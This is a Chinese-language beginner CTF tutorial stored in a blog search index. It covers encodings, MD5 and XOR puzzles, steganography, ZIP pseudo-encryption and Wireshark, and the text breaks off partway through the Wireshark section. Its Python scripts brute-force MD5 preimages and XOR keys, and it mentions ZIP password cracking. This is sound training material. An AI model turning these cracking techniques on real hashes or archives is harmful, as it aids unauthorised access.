<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>CTF入坑</title>
      <link href="/CTF%E5%85%A5%E5%9D%91/"/>
      <url>/CTF%E5%85%A5%E5%9D%91/</url>
      
        <content type="html"><![CDATA[<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190805.jpg" alt=""></p><a id="more"></a><h1 id="CTF学习"><a href="#CTF学习" class="headerlink" title="CTF学习"></a>CTF学习</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本内容主要以解题模式为学习重点，由Stalker-16成员(Danie1,7iny)整理。</p><h2 id="day01–7iny"><a href="#day01–7iny" class="headerlink" title="day01–7iny"></a>day01–7iny</h2><h3 id="解题模式CTF赛题目类别与能力对应"><a href="#解题模式CTF赛题目类别与能力对应" class="headerlink" title="解题模式CTF赛题目类别与能力对应"></a>解题模式CTF赛题目类别与能力对应</h3><p>· Web-Web应用的漏洞挖掘和利用<br>· PWN-逆向分析、漏洞挖掘、漏洞利用、安全编程<br>· Reverse Engineering-逆向分析、安全编程<br>· Crypto-密码、逆向分析、安全编程<br>· PPC（Professional Programming and Coding）-安全编程<br>· Forensic-网络流量分析、隐写分析、系统取证等<br>· Recon-社工、情报搜集分析</p><h3 id="相应的赛题要求"><a href="#相应的赛题要求" class="headerlink" title="相应的赛题要求"></a>相应的赛题要求</h3><p>PWN、Reverse偏重对汇编、逆向的理解<br>Crypto偏重对数学、算法的深入学习<br>Web偏重对技巧沉淀、快速搜索能力的挑战<br>Misc则更为复杂，所有与计算机安全挑战有关的都算在其中</p><h3 id="如何入门–如何学？"><a href="#如何入门–如何学？" class="headerlink" title="如何入门–如何学？"></a>如何入门–如何学？</h3><p>1、恶补基础知识（有基础的跳过此步）</p><blockquote><p>都需要学的内容：<br>Linux基础、计算机组成原理、操作系统原理、网络协议分析<br>PWN+Reverse+Crypto随机搭配：<br>IDA工具使用（f5插件）、逆向工程、密码学、缓冲区溢出等<br>Web+Misc组合：<br>网络安全、内网渗透、数据库安全等</p></blockquote><p>2、尝试从脑洞开始（hackgame）</p><blockquote><p>1.<a href="https://prompt.ml/0" target="_blank" rel="noopener">xss练习平台</a></p><p>2.<a href="https://redtiger.labs.overthewire.org/" target="_blank" rel="noopener">sql注入挑战</a></p></blockquote><p>3、从基础题目出发</p><blockquote><p>刷题站点：</p><p>1.<a href="https://www.ichunqiu.com" target="_blank" rel="noopener">i春秋</a> </p><p>2.<a href="https://adworld.xctf.org.cn/" target="_blank" rel="noopener">xctf攻防世界</a></p><p>3.<a href="http://www.wechall.net/challs" target="_blank" rel="noopener">国外CTF题库</a></p><p>4.<a href="https://microcorruption.com/login" target="_blank" rel="noopener">国外PWN+Reverse方向</a></p><p>5.<a href="https://smashthestack.org/" target="_blank" rel="noopener">ssh连接玩wargame</a></p><p>6.<a href="https://overthewire.org/wargames/" target="_blank" rel="noopener">老牌wargame</a></p><p>7.<a href="https://pwnable.kr/play.php" target="_blank" rel="noopener">pwn题库</a></p></blockquote><p>4、学习信息安全专业知识</p><blockquote><p>书籍</p><p>PWN+Reverse+Crypto随机搭配：<br>RE for Beginners（逆向工程入门）<br>IDA Pro权威指南<br>揭秘家庭路由器0day漏洞挖掘技术<br>自己动手写操作系统<br>黑客攻防技术宝典：系统实战篇</p><p>Web+Misc组合：<br>Web应用安全权威指南<br>Web前端黑客技术揭秘<br>黑客秘籍-渗透测试实用指南<br>黑客攻防技术宝典Web实战篇<br>代码审计：企业级Web代码安全架构</p></blockquote><p>5、锻炼体力而耐力</p><h3 id="工具下载"><a href="#工具下载" class="headerlink" title="工具下载"></a>工具下载</h3><blockquote><p>以下是由各大大佬整理的工具库，全部放在了github上</p><p>1.<a href="https:/github.com/truongkma/ctf-tools" target="_blank" rel="noopener">工具库1</a> </p><p>2.<a href="https://github.com/zardus/ctf-tools" target="_blank" rel="noopener">工具库2</a></p><p>3.<a href="https:/github.com/TUCTF/Tools" target="_blank" rel="noopener">工具库3</a></p></blockquote><h3 id="MISC学习"><a href="#MISC学习" class="headerlink" title="MISC学习"></a>MISC学习</h3><p>学习MISC的好处：MISC可能是切入CTF竞赛领域、培养兴趣的最佳入口<br>1.基础知识/技能面、逆向思维<br>2.“解谜”能力、“脑洞”大开</p><p>1.国外：Google Map、Earth、Street View<br>2.国内：Baidu地图、卫星视图、全景视图：map.baidu.com腾讯地图、卫星、街景：map.qq.com<br>· 从网络世界到物理世界<br>1.IP2Location IP地址（因特网上的虚拟地址）&gt;现实世界中的具体地理位置<br>2.IP2Location数据库：WHOIS数据库，GeolP，IP2Location，纯真数据库（QQIP查询使用）<br>· Google image search<br>1.搜索图片含义和外观类似图片</p><p>2.Encoding Analysis 编码分析<br>· 二进制编码<br>· 十六进制编码<br>1.单字节：00-FF·ASClI字符编码<br>2.字母：A-Z：41-5A；a-Z：61-7A<br>· Base64编码<br>1.基于64个可打印字符来表示二进制数据的表示方法<br>2.字符集：大小写字母各26个，10个数字，加号“+”，斜杠“/”，一共64个字符，等号“=”用来作为后缀用途<br>· Huffman Code-无损压缩编码，01串显示<br>· 条形码：宽度不等的多个黑条和空白，按照一定的编码规则排列，用以表达一组信息的图形标识符<br>·国际标准</p><ul><li>EAN-13：商品条码标准，13位数字</li><li>Code-39：39字符</li><li>Code-128：128字符<br>·条形码</li><li>在线条码生成器/识别器</li><li>ZXing-多平台条形码生成、扫码库<br>条形码在线解码：<a href="https://online-barcode-reader.inliteresearch.com/" target="_blank" rel="noopener">网站</a><br>题目1：Barcode.jpeg<br>· 二维码：用某种特定几何图形按一定规律在平面（二维方向上）分布的黑白相间的图形记录数据符号信息<br>1.堆叠式/行排式二维条码：Code 16K、Code49、PDF417<br>2.矩阵式二维码：QR CODE<blockquote><p>常见题目二维码、条形码的恢复<br>参考文章：<a href="https://www.freebuf.com/geek/204516.html" target="_blank" rel="noopener">freebuf</a><br>练习平台：<a href="http://daka.whaledu.com:9999/" target="_blank" rel="noopener">蓝鲸安全打卡练习场</a><br>参考writeup:<a href="https://www.jianshu.com/p/27b8be64811e" target="_blank" rel="noopener">简书</a></p></blockquote></li></ul><p>练习蓝鲸安全打卡练习场题目：<br>1.破碎的心–画图按住ctrl，按上下键不断还原<br>2.黑白打字机–画图ctrl+shift+i反色，图片隐写解密，86版五笔对照表</p><blockquote><p>图片隐写解密软件<a href="http://www.oyksoft.com/soft/19151.html" target="_blank" rel="noopener">下载地址</a></p></blockquote><p>3.Forensic Analysis 取证分析</p><p>· 取证分析-取证对象<br>1.文件file<br>2.磁盘disk<br>3.网络数据包pcap<br>4.内存dump<br>5.系统镜像image<br>· 取证分析挑战目标<br>1.一般为发现在取证对象中隐藏的Flag（代表要取证的敏感信息）<br>2.取证分析通常和隐写分析联系在一起<br>· 文件格式分析常用命令和工具<br>1.基本命令file、identify、strings：用于文件类型探测<br>2.winhex、UE：用于直接察看文件16进制数据<br>3.binwalk：分析二进制文件，提取其中隐藏文件等<br>· 需要了解常见文件特征串<br>1.<a href="http://en.wikipedia.org/wiki/List" target="_blank" rel="noopener">http://en.wikipedia.org/wiki/List</a> of file signatures<br>2.特别是JPEG、PNG、GIF、BMP等图片文件，ZIP、RAR、TAR、7z等压缩文件，mp3、wma、avi等音视频文件</p><p>音频取证<br>· <a href="https://iboxgalileogiftedschoolor-my.sharepoint.com/personal/wangshusong_auooo_com/_layouts/15/guestaccess.aspx?docid=0f7d6900c9d0e49f6847482800cec4f0c&amp;authkey=AZdJzcQaggeMsOlvhXc-cZs&amp;e=zV8BNd" target="_blank" rel="noopener">Audacity</a>音频处理软件，查看声音波形</p><p><a href="https://www.sqlsec.com/2018/01/ctfwav.html" target="_blank" rel="noopener">国光音频取证总结</a></p><p>磁盘取证<br>· 磁盘分区格式<br>1.Windows:FAT12-&gt;FAT16-&gt;FAT32-&gt;NTFS<br>2.Linux:EXT2-&gt;EXT3-&gt;EXT4<br>3.FAT主磁盘结构</p><p>| 主引导区 | 文件分配表#1 | 文件分配表#2 | 根目录 | 其他所有数据剩下磁盘空间 |</p><p>删除文件<br>·目录表中文件名第一字节E5<br>·文件恢复和取证工具<br>EasyRecovery、MedAnalyze、FTK<br>网络数据包Pcap取证分析<br>· Wireshark工具<br>书籍《Wireshark抓包分析实战》<br>· 流量统计和会话列表<br>· 善用过滤规则，找出关注的网络流纪录<br>· 流重组：Follow TCP Stream<br>· 常见网络通信协议的理解<br>IP/TCP、UDP/HTTP、DNS、.….<br>·提取流中的文件数据</p><p>内存与image镜像取证分析<br>· 内存取证<br>1.Volatility内存镜像分析工具<br>2.解析Windows/Linux/MacOSX内存结构<br>3.分析当前运行进程列表、进程内存数据等<br>4.根据题目提示寻找线索和思路，提取分析指定进程的特定内存数据<br>· Image镜像取证<br>1.Binwalk<br>2.根据题目提示提取镜像中需关注的文件<br>3.分析提取文件中的应用层数据</p><p>4.Steganalysis 隐写分析</p><p>隐写术<br>· 隐写载体<br>1.文本<br>2.图片<br>3.音频<br>4.视频<br>· 隐写方法和工具<br>1.RSD、LSB、DCT<br>2.<a href="https://en.wikipedia.org/wiki/Steganography_tools" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Steganography_tools</a></p><p><a href="https://www.sqlsec.com/2018/01/ctfimg.html" target="_blank" rel="noopener">国光图片隐写总结</a></p><p>· 识别隐写<br>1.统计分析<br>2.Noise floor consistency analysis 噪声一致性分析<br>· 隐写识别工具<br>1.Stegdetect<br>2.StegSecret<br>3.GFE Stealth<br>· 隐写分析<br>1.<a href="http://www.garykessler.net/library/fsc_stego.html" target="_blank" rel="noopener">http://www.garykessler.net/library/fsc_stego.html</a></p><h2 id="day01–Danie1"><a href="#day01–Danie1" class="headerlink" title="day01–Danie1"></a>day01–Danie1</h2><hr><p>MISC(Miscellaneous)类型，即安全杂项，题目或涉及流量分析、电子取证、人肉搜索、数据分析等等。</p><p>例题<code>day01.zip</code>下载网盘<a href="https://pan.baidu.com/s/1P_dQTLxLwdA1anIGdgWqZw" target="_blank" rel="noopener">链接</a> 提取码: fjru</p><h3 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h3><hr><h4 id="摩斯密码"><a href="#摩斯密码" class="headerlink" title="摩斯密码"></a>摩斯密码</h4><ul><li>例：  ..-. .-.. .- –. .—- ..— …– ….- ….. -…. </li><li><a href="http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx" target="_blank" rel="noopener">http://www.zhongguosou.com/zonghe/moErSiCodeConverter.aspx</a></li></ul><h4 id="凯撒密码"><a href="#凯撒密码" class="headerlink" title="凯撒密码"></a>凯撒密码</h4><ul><li><p>它是一种替换加密的技术，<a href="https://baike.baidu.com/item/%E6%98%8E%E6%96%87" target="_blank" rel="noopener">明文</a>中的所有字母都在<a href="https://baike.baidu.com/item/%E5%AD%97%E6%AF%8D%E8%A1%A8" target="_blank" rel="noopener">字母表</a>上向后（或向前）按照一个固定数目进行偏移后被替换成<a href="https://baike.baidu.com/item/%E5%AF%86%E6%96%87" target="_blank" rel="noopener">密文</a>。</p></li><li><p>例： iodj{dvgi}</p></li><li><a href="https://www.qqxiuzi.cn/bianma/kaisamima.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/kaisamima.php</a></li></ul><h4 id="base编码"><a href="#base编码" class="headerlink" title="base编码"></a>base编码</h4><ul><li><p>base16:</p><p>Base16编码就是将ASCII字符集中可打印的字符(数字0~9和字母A~F)对应的二进制字节数据进行编码</p></li><li><p>编码的方式: 根据ASCII编码得到对应的二进制,将所有二进制串起来,然后按4个二进制位分割,转化成十进制数值,根据Base16编码表得到编码</p></li><li><p>例将”ILU”字符串加密</p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080501.png" alt=""></p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080502.png" alt=""></p></li></ul><ul><li><p>base32:</p><p>与Base16编码区别的是,Base32使用了ASCII编码中可打印的32个字符(大写字母A~Z和数字2~7)对任意字节数据进行编码.Base32将串起来的二进制数据按照5个二进制位分为一组,由于传输数据的单位是字节(即8个二进制位).所以分割之前的二进制位数是40的倍数(40是5和8的最小公倍数).如果不足40位,则在编码后数据补充”=”</p></li><li><p>编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制,将所有二进制串起来,然后按照5个二进制位为一组分割 ,得到十进制值=&gt;找到Base32编码表找到对应的字符.案例总共分割成了5组(25位),还差三组(15位).在末尾补充3个”=”.</p></li><li>例将”ILU”字符串加密</li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/20190080503.png" alt=""></p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080504.png" alt=""></p></li></ul><ul><li><p>base64:</p><p>Base64编码使用了ASCII编码中64个可打印的字符(大写字母A~Z,小写字母a~z,数字0~9以及”+”,”/“)将任意字节数据进行编码.Base64编码将串起来的二进制以6位进行分割.所以分切之前的二进制位数应该是24的倍数(即6,8的最小公倍数).如果不足24位,则在编码后数据后面添加”=”</p></li><li><p>编码方式：先根据ASCII编码得到对应字符编码值以及对应二进制，将串起来的二进制按6位分为一组.得到4组(24位).所以末尾不用补充”=”</p></li><li>例将”ILU”字符串加密</li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080505.png" alt=""></p></li><li><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080506.png" alt=""></p></li></ul><ul><li><p>题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">MzQ0MTM1MzYzNDQ1MzQzNjM0NDYzNTMyMzMzMjM0MzQzNDQzMzQzOTM1NDEzNTM0MzQzNzM1MzQzNDQyMzQzNzM0NDMzNDQxMzQ0MzM1MzUzNTMzMzUzNzM1MzMzNTM1MzQ0MTM0MzIzNDM4MzQzNTM0MzUzNDQ1MzUzMzM1MzIzNDM4MzUzNTMzMzYzNTM0MzMzMjM1MzAzNDM5MzM0NA==</span><br><span class="line"></span><br><span class="line">flag格式：flag&#123;xxxx&#125;</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bs</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>):</span><br><span class="line">        ok = <span class="number">0</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s1 = base64.b64decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s1</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s2 = base64.b32decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s2</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            s3 = base64.b16decode(s).decode(<span class="string">'ascii'</span>)</span><br><span class="line">            ok = <span class="number">1</span></span><br><span class="line">            s=s3</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ok == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span>  s</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    s = raw_input(<span class="string">"请输入字符串:"</span>)</span><br><span class="line">    res = bs(s)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'---------------------------'</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">'result:'</span>+ res</span><br></pre></td></tr></table></figure></li></ul><h3 id="ascii编码"><a href="#ascii编码" class="headerlink" title="ascii编码"></a>ascii编码</h3><ul><li><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080508.png" alt=""></li></ul><h3 id="unicode编码"><a href="#unicode编码" class="headerlink" title="unicode编码"></a>unicode编码</h3><p>  例：<code>&amp;#102;&amp;#108;&amp;#97;&amp;#103;</code></p><ul><li><a href="http://tool.chinaz.com/tools/unicode.aspx" target="_blank" rel="noopener">http://tool.chinaz.com/tools/unicode.aspx</a></li></ul><h4 id="MD5"><a href="#MD5" class="headerlink" title="MD5"></a>MD5</h4><ul><li><p>MD5即Message-Digest Algorithm 5（信息-摘要算法5），用于确保信息传输完整一致。是计算机广泛使用的杂凑算法之一</p></li><li><p>加密</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080509.png" alt=""></p></li><li><p>解密：<a href="https://www.cmd5.com/" target="_blank" rel="noopener">https://www.cmd5.com/</a></p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080510.png" alt=""></p></li></ul><ul><li><p>题目1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">md5(?)[:6] == &apos;233333&apos;</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">100000000</span>):</span><br><span class="line">m = hashlib.md5()</span><br><span class="line">m.update(str(i).encode(<span class="string">'utf-8'</span>))</span><br><span class="line">res = m.hexdigest()</span><br><span class="line"><span class="keyword">if</span> res[:<span class="number">6</span>] == <span class="string">'233333'</span>:</span><br><span class="line"><span class="keyword">print</span> i</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></li><li><p>题目2</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">已知一段由5个大写字母组成的明文字符串，经过md5加密后的密文前6位为73acd9,求加密前的明文</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment"># -*-coding:utf-8-*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"></span><br><span class="line">letter = <span class="string">'ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> letter:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> letter:</span><br><span class="line">        <span class="keyword">for</span> k <span class="keyword">in</span> letter:</span><br><span class="line">            <span class="keyword">for</span> l <span class="keyword">in</span> letter:</span><br><span class="line">                <span class="keyword">for</span> n <span class="keyword">in</span> letter:</span><br><span class="line">                    cipher = i+j+k+l+n</span><br><span class="line">                    m = hashlib.md5()</span><br><span class="line">                    m.update(cipher)</span><br><span class="line">                    res = m.hexdigest()</span><br><span class="line">                    <span class="keyword">if</span> res[:<span class="number">6</span>] == <span class="string">'73acd9'</span>:</span><br><span class="line">                        <span class="keyword">print</span> res</span><br><span class="line">                        <span class="keyword">print</span> cipher</span><br><span class="line">                        <span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><h4 id="异或"><a href="#异或" class="headerlink" title="异或"></a>异或</h4><ul><li><p>相同为0，不同为1</p></li><li><p>题目</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">密文 : FR8SFAgwJzUWASwLHAEsAA4=</span><br></pre></td></tr></table></figure></li><li><p>代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!usr/bin/python  </span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-  </span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">ming = <span class="string">'FR8SFAgwJzUWASwLHAEsAA4='</span></span><br><span class="line">mi=base64.b64decode(ming)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">127</span>):</span><br><span class="line"></span><br><span class="line">flag=<span class="string">''</span>  </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(mi)):</span><br><span class="line">t=ord(mi[i])^j</span><br><span class="line">flag+=chr(t)</span><br><span class="line"><span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">in</span> flag :</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="keyword">break</span></span><br></pre></td></tr></table></figure></li></ul><h3 id="图片隐写"><a href="#图片隐写" class="headerlink" title="图片隐写"></a>图片隐写</h3><hr><p>图片隐写主要考察信息在图片中隐写的几种方法，文件头信息修改，stegsolve工具使用，LSB算法，binwalk工具使用等知识。</p><h4 id="常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）"><a href="#常用工具介绍（常用工具下载地址：https-www-ctftools-com-down-）" class="headerlink" title="常用工具介绍（常用工具下载地址：https://www.ctftools.com/down/）"></a>常用工具介绍（常用工具下载地址：<a href="https://www.ctftools.com/down/）" target="_blank" rel="noopener">https://www.ctftools.com/down/）</a></h4><ul><li><p>binwalk：是一个固件分析工具，多用于逆向工程、取证、隐写分析</p></li><li><p>winhex：是在Windows下执行的十六进制编辑软件，此软件功能强大，有完好的分区管理功能和文件管理功能，在CTF中一般用来查看文件头格式、修改16进制数据等。</p></li><li><p>Stegsolve：是一款图片分析工具，功能十分强大</p></li><li><p>Stegdetect：是一种数字图像隐写分析工具，主要实现JPEG图像的隐秘信息的嵌入的检测</p></li><li><p>foremost：和binwalk结合使用，提取隐藏信息。</p></li><li><p>MP3stego：音频隐写工具 （链接：<a href="https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg" target="_blank" rel="noopener">https://pan.baidu.com/s/1fSSX-e-Q95GY0bftght3Pg</a><br>提取码：0r3r ）<br>复制这段内容后打开百度网盘手机App，操作更方便哦</p><ul><li><p>用法：隐藏信息  encode -E hidden_text.txt -P pass svega.wav stego.mp3</p><p>提取信息 decode -X -P pass svega_stego.mp3</p></li></ul></li><li><p><a href="https://blog.csdn.net/xiangshangbashaonian/article/details/80156865" target="_blank" rel="noopener">常见文件文件头格式</a></p></li><li><p>题目</p><ol><li><p>查看属性 meinv.jpg  （易）</p></li><li><p>查看图片内容   hacker.jpg   （易）</p></li><li><p>binwalk + mp3stego   3.jpg  （中）</p></li><li><p>binwalk + 伪加密 carefully.jpg （中）  （ps：伪加密是在未加密的zip文件基础上修改了它的压缩源文件目录区里的全局方式位标记的比特值，使得压缩软件打开它的时候识别为加密文件，提示输入密码， 而在这个时候，不管你用什么软件对其进行密码破解，都无法打开它） </p><p>伪加密（<a href="https://blog.csdn.net/qq_26187985/article/details/83654197）" target="_blank" rel="noopener">https://blog.csdn.net/qq_26187985/article/details/83654197）</a></p><p>将如图位置的09改为00即可，或者使用工具ZipCenOp.jar (用法 java -jar ZipCenOp.jar r xxx.zip)</p><p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080507.png" alt=""></p></li><li><p>gif帧   flag.png.gif    (易)</p></li><li><p>压缩包爆破   love.zip   （中）</p></li><li><p>LSB隐写 tanwanlanyue   （中）</p></li><li><p>其他  f1ag.png   (中)</p></li><li><p>png改高度    dabai.png   (中) </p><p>ps:png文件格式简介：</p><p>89 50 4E 47 是文件的格式</p><p>00 00 00 0D说明IHDR头块长为13</p><p>49 48 44 52 IHDR标识</p><p>00 00 01 F4  图像的宽</p><p>00 00 01 A4 图像的高</p></li></ol></li></ul><h3 id="lsb隐写"><a href="#lsb隐写" class="headerlink" title="lsb隐写"></a>lsb隐写</h3><hr><p>首先来讲png图片，png图片是一种无损压缩的位图片形格式，也只有在无损压缩或者无压缩的图片（BMP）上实现lsb隐写。如果图像是jpg图片的话，就没法使用lsb隐写了，原因是jpg图片对像数进行了有损压缩，我们修改的信息就可能会在压缩的过程中被破坏。而png图片虽然也有压缩，但却是无损压缩，这样我们修改的信息也就能得到正确的表达，不至于丢失。BMP的图片也是一样的，是没有经过压缩的。BMP图片一般是特别的大的，因为BMP把所有的像数都按原样储存，没有进行压缩。<br>png图片中的图像像数一般是由RGB三原色（红绿蓝）组成，每一种颜色占用8位，取值范围为0x00~0xFF，即有256种颜色，一共包含了256的3次方的颜色，即16777216种颜色。而人类的眼睛可以区分约1000万种不同的颜色，这就意味着人类的眼睛无法区分余下的颜色大约有6777216种。<br>    LSB隐写就是修改RGB颜色分量的最低二进制位也就是最低有效位（LSB），而人类的眼睛不会注意到这前后的变化，每个像数可以携带3比特的信息。</p><h2 id="day02–7iny"><a href="#day02–7iny" class="headerlink" title="day02–7iny"></a>day02–7iny</h2><h3 id="内容简介："><a href="#内容简介：" class="headerlink" title="内容简介："></a>内容简介：</h3><p>day02以流量分析，加密解密为主。例题<code>day02.zip</code>下载网盘<a href="https://pan.baidu.com/s/1P_dQTLxLwdA1anIGdgWqZw" target="_blank" rel="noopener">链接</a> 提取码: fjru</p><h3 id="Wireshark："><a href="#Wireshark：" class="headerlink" title="Wireshark："></a>Wireshark：</h3><p>Wireshark是目前全球使用最广泛的开源抓包软件（前身为Etherea1），是一个通用化的网络数据嗅探器和协议分析器，由Gerald Combs编写并于1998年以GPL开源许可证发布。</p><h3 id="推荐资料："><a href="#推荐资料：" class="headerlink" title="推荐资料："></a>推荐资料：</h3><p>《Wireshark数据包分析实战》第二版Chris Sanders<br>《Wireshark网络分析》第二版Laura Chappe11<br>《TCP/IP协议栈详解卷一》W.Richard Stevens</p><h3 id="相关站点："><a href="#相关站点：" class="headerlink" title="相关站点："></a>相关站点：</h3><p>官网下载<a href="https://www.wireshark.org/#download" target="_blank" rel="noopener">地址</a></p><p>官方<a href="https://wiki.wireshark.org/" target="_blank" rel="noopener">wiki页面</a></p><h3 id="流量分析："><a href="#流量分析：" class="headerlink" title="流量分析："></a>流量分析：</h3><p><strong>流量分析有以下三个方向：</strong><br>1、流量包修复<br>2、协议分析<br>3、数据提取<br><strong>转载</strong>来自<code>Yokeen总结</code></p><h4 id="1、流量包修复"><a href="#1、流量包修复" class="headerlink" title="1、流量包修复"></a>1、流量包修复</h4><p>通常都借助现成的工具例如PCAPFIX直接修复</p><ul><li><p><a href="https://f00l.de/hacking/pcapfix.php" target="_blank" rel="noopener">在线PCAPFIX</a></p></li><li><p>PCAPFIX<a href="https://github.com/Rup0rt/pcapfix/tree/devel" target="_blank" rel="noopener">下载</a><br>流量包常见的块，详细介绍可以看：<a href="http://www.tcpdump.org/pcap/pcap.html" target="_blank" rel="noopener">http://www.tcpdump.org/pcap/pcap.html</a></p></li></ul><h4 id="2、协议分析"><a href="#2、协议分析" class="headerlink" title="2、协议分析"></a>2、协议分析</h4><p>须掌握wireshark过滤器（捕捉过滤器与显示过滤器）的基础语法，从而更快更精准的获取指定的信息。<br><code>捕捉过滤器</code>：用于决定将什么样的信息记录在捕捉结果中，需要在开始捕捉前设置。<br><code>显示过滤器</code>：用于在捕获结果中进行详细查找，可以在得到捕捉结果后进行更改<br>捕捉过滤器基础语法<br>Protocol Direction Host(s) Value LogicalOperations other expression<br>tcp dst 10.1.1.1 80 and tcp dst 10.2.2.2 